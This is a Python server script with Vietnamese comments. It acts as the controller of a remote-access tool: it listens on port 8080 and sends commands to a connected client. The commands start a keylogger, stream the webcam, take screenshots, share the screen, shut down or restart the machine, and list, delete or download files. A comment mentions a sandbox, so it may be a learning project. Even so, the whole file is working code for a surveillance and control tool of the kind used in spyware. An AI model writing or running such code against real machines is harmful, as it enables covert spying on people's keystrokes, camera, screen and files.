import socket
import struct
import cv2
import numpy as np
def receive_file(conn, filename):
    print(f"Đang tải file {filename} từ Client...")
    
    # Dùng chuẩn <Q> (8-bytes) để không bị lệch hệ điều hành
    payload_size = struct.calcsize("<Q>")
    raw_msglen = recvall(conn, payload_size)
    if not raw_msglen:
        print("Lỗi đường truyền: Không nhận được kích thước file.")
        return
        
    msglen = struct.unpack("<Q>", raw_msglen)[0]

    if msglen == 0:
        print("Lỗi: File không tồn tại hoặc bị từ chối truy cập từ Client!")
        return

    # Quá trình Chunking lúc nhận: Hứng từng lát 4KB và lưu ngay xuống đĩa
    save_path = f"downloaded_{filename}"
    with open(save_path, 'wb') as f:
        bytes_received = 0
        while bytes_received < msglen:
            # Tính toán xem nên hứng 4096 bytes hay hứng phần vụn còn sót lại
            chunk_size = min(4096, msglen - bytes_received)
            chunk = conn.recv(chunk_size)
            if not chunk:
                print("\n[-] Lỗi: Đứt mạng giữa chừng khi đang tải!")
                break
            f.write(chunk)
            bytes_received += len(chunk)
            
    print(f"Đã tải xong! File được lưu tại: {save_path}")
    
def recvall(conn, n):
    data = bytearray()
    while len(data) < n:
        packet = conn.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def receive_stream(conn):
    print("Đang nhận luồng Webcam... (Bấm 'q' trên cửa sổ video để thoát)")
    payload_size = struct.calcsize("<Q>")

    while True:
        raw_msglen = recvall(conn, payload_size)
        if not raw_msglen:
            break
        msglen = struct.unpack("<Q>", raw_msglen)[0]

        frame_data = recvall(conn, msglen)
        if frame_data is None:
            break

        nparr = np.frombuffer(frame_data, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        cv2.imshow('Webcam Livestream', frame)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cv2.destroyAllWindows()


# --- HÀM NHẬN ẢNH CHỤP MÀN HÌNH MỚI THÊM VÀO ---
def receive_screenshot(conn):
    print("Đang nhận dữ liệu ảnh màn hình từ Client...")
    payload_size = struct.calcsize("<Q>")

    # B1: Nhận 4 bytes kích thước
    raw_msglen = recvall(conn, payload_size)
    if not raw_msglen:
        print("Không nhận được kích thước ảnh.")
        return
    msglen = struct.unpack("<Q>", raw_msglen)[0]

    frame_data = recvall(conn, msglen)
    if frame_data is None:
        print("Dữ liệu ảnh bị lỗi.")
        return

    nparr = np.frombuffer(frame_data, np.uint8)
    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

    cv2.imshow('Remote Screenshot', frame)
    print("👉 Đã hiển thị ảnh! Hãy click vào cửa sổ ảnh và bấm PHÍM BẤT KỲ để tiếp tục gõ lệnh.")
    cv2.waitKey(0)
    cv2.destroyWindow('Remote Screenshot')


def receive_key_logger(conn):
    print("Đang nhận dữ liệu Keylogger... (Nhấn 'Esc' trên máy Client để kết thúc dữ liệu)")
    while True:
        data = conn.recv(1024)
        if not data:
            break
        decoded_data = data.decode('utf-8', errors='ignore')

        if "[ESC_STOP]" in decoded_data:
            print("\n[+] Keylogger stopped by client.")
            break
        print(decoded_data, end='', flush=True)

def receive_screen(conn):
    print("Đang nhận luồng chia sẻ màn hình... (Bấm 'q' trên cửa sổ video để thoát)")
    payload_size = struct.calcsize("<Q>")
    while True:
        raw_msglen = recvall(conn, payload_size)
        if not raw_msglen:
            break
        msglen = struct.unpack("<Q>", raw_msglen)[0]
        
        frame_data = recvall(conn, msglen)
        if frame_data is None:
            break
            
        nparr = np.frombuffer(frame_data, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        

        cv2.imshow('Live Screen Sharing', frame)
        
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
            
    cv2.destroyAllWindows()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 8080))
server.listen(1)

try:
    while True:
        print("\n[+] Đang chờ kết nối mới từ client...")
        conn, addr = server.accept()
        print(f"[+] Đã kết nối thành công với: {addr}")

        try:
            conn.sendall(b'Hello from server!')
            messages = conn.recv(1024).decode('utf-8')
            print(f"[*] Phản hồi từ client: {messages}")

            while True:
                cmd = input('\nenter command (type "exit" to kick client): ').strip()

                if not cmd:
                    continue

                if cmd == 'exit':
                    conn.sendall(b'exit')
                    print("[*] Exiting session with current client.")
                    break
                if cmd == 'power':
                    sub_cmd = input('what power mode (shutdown/restart/sleep): ').strip()
                    cmd = f"power:{sub_cmd}"
                conn.sendall(bytes(cmd, 'utf-8'))
                if cmd == 'stream':
                    receive_stream(conn)
                elif cmd == 'screenshot':
                    receive_screenshot(conn)
                elif cmd == 'keylogger':
                    receive_key_logger(conn)
                elif cmd == 'screen':
                    receive_screen(conn)
                elif cmd == 'power:sleep':
                    print("[*] Sent sleep command. Client is disconnecting to sleep...")
                    break

                elif cmd == 'list_files':
                    # Chờ nhận bản text danh sách file từ Client và in ra
                    response = conn.recv(4096).decode('utf-8', errors='ignore')
                    print(f"\n--- DANH SÁCH FILE TRONG SANDBOX ---\n{response}\n---")
                    
                elif cmd.startswith('delete_file '):
                    # Chờ nhận thông báo kết quả xóa (thành công hay thất bại)
                    response = conn.recv(1024).decode('utf-8', errors='ignore')
                    print(f">>> {response}")
                    
                elif cmd.startswith('download_file '):
                    # Tách lệnh ra để lấy tên file, sau đó gọi hàm nhận file
                    try:
                        _, filename = cmd.split(' ', 1)
                        receive_file(conn, filename)
                    except ValueError:
                        print("Lỗi cú pháp. Hãy gõ đúng định dạng: download_file <ten_file>")

        except (socket.error, ConnectionResetError, BrokenPipeError) as e:
            print(f"\n[-] Client connection lost abruptly: {e}")

        finally:
            print("[*] Closing current client socket handle.")
            conn.close()

except KeyboardInterrupt:
    print("\n[-] Server shutting down manually.")
finally:
    server.close()
